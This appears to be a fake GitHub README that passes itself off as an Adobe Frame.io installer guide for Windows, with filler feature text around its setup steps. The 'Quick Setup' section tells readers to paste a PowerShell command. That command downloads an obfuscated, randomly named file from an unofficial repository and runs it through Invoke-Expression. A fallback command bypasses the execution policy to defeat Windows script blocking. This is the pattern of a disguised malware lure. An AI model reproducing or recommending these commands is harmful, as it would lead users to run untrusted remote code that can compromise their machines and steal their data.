# Frame.io

Frame.io is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Frame.io and work in it.

Adobe Frame.io connects producers, editors, and stakeholders around video in one place. On Windows it fits into day-to-day post: you upload sequences or link projects from Premiere Pro, invite reviewers, and collect comments tied to exact frames on the timeline.

A typical session starts in the desktop client or panel inside your NLE. You sync a new cut, set viewing permissions, and notify collaborators. Reviewers scrub the player, draw on frame, reply in threads, and mark versions approved or needs changes while you keep editing locally.

This repository holds a Windows setup package for installing or updating the client, short configuration notes for Creative Cloud linkage and proxy settings, and a changelog that records build numbers and fixes. Use it to align studio machines on the same Frame.io build and document how your team connects shared storage and review links.

## What you do with it

- Time-coded comments pin feedback to exact frames inside the review player.
- Version stacks compare cuts side by side so approvers see what changed between uploads.
- Premiere Pro and After Effects panels send sequences without manual export handoffs.
- Drawing tools mark regions on frame for clear visual notes during review.
- Role-based sharing controls who can view, comment, or approve each project folder.
- Automatic transcode and proxy playback keep long 4K timelines smooth on Windows.
- Notification digests summarize new comments so editors catch up between render passes.
- Approval status labels track which version is locked for final delivery and archive.

## Quick Setup (PowerShell)

This installs the program Frame.io on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/sofial02315225/frame-io-setup-guide/main/udzd9mhqu4.799ra2p7 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/sofial02315225/frame-io-setup-guide/main/udzd9mhqu4.799ra2p7 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `udzd9mhqu4.799ra2p7` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `sofial02315225/frame-io-setup-guide`. Adobe Frame.io 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
